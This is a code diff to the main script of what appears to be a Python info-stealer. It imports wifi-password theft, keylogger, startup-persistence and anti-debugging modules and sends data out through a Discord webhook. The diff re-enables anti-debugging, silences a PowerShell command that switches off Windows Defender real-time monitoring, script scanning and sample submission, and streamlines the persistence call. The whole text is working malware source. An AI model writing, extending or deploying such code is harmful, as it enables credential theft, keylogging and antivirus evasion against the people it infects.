@@ -4,7 +4,7 @@ from modules.info import start
 from modules.wifi import WifiPasswords
 from modules.keylogger import Keylogger
 from modules.startup import StartUp
-#from modules.antidebug import Antidebug
+from modules.antidebug import Antidebug
 from tkinter import messagebox
 import os
 import zipfile
@@ -13,20 +13,19 @@ import discord
 from discord import File, SyncWebhook
 import socket
 import requests
-from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK#, ANTIDEBUG
+from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK, ANTIDEBUG
 
-#if ANTIDEBUG:
-#    try:
-#        AntiDebug = Antidebug()
-#        AntiDebug.check()
-#    except:
-#        pass
+if ANTIDEBUG:
+    try:
+        Antidebug()
+    except:
+        pass
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
     cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
     try:
-        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
+        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)#subprocess.run(cmd, capture_output=True)
     except:
         pass
     
@@ -58,8 +57,7 @@ except:
 
 if STARTUP:
     try:
-        startup = StartUp()
-        startup.run()
+        StartUp()
     except:
         pass
 
